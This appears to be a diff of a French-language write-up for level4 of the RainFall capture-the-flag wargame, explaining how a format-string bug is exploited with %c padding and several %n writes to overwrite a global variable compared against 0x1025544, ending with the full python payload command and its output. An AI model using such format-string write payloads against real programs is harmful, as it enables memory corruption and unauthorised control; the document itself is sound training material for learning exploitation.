@@ -10,7 +10,24 @@ abc
 
 Reecriture du code source en utilisant objdump -d et gdb avec peda
 
-Programme similaire a celui du level precedent
+Programme similaire a celui du level precedent avec un printf et un cmp mais avec une valeur beaucoup plus eleve
+
+0x804848d <n+54>:	mov    eax,ds:0x8049810
+0x8048492 <n+59>:	cmp    eax,0x1025544
+
+0x8049810 -> Adresse de comparais avec 0x1025544
+"%x" * 11 -> offset vers la stack du printf 
+"%n" -> force le printf a ecrire le nombre de caractere affiche precedemment a l'adresse cible
+
+Les limites du programme et du printf nous empeche de passer 1025544 caracteres
+
+Il faut alors modifie octet par octet en passant l'adresse de chacun d'elle, le nombre de caracteres augmente entre chaque champs nous compliquant la tache.
+
+Le premier probleme etant le premier octet devant etre egal a 0x44 et le nombre de caracteres transmis sans ajout de caractere etant de 0x50 (il est possible de revenir a 0x44 avec l'overflow mais cela influe sur les octets suivants)
+
+La solution etant d'utiliser %c au lieu de %x en affichant qu'un caractere a la place de toute la valeur hexa des 11 adresses.
+
+Il suffit alors par tatillon de retrouver les valeurs, le 4eme octet n'etant pas modifier avec ce payload car avec une valeur de seulement 1 on peut utiliser l'overflow sur le 3eme octet
 
 level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "\x11\x98\x04\x08" + "\x12\x98\x04\x08" + "%c" * 11 + "A" * 45 + "%n" + "B" * 17 + "%n" + "C" * 173 + "%n"' | ./level4
 �T����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
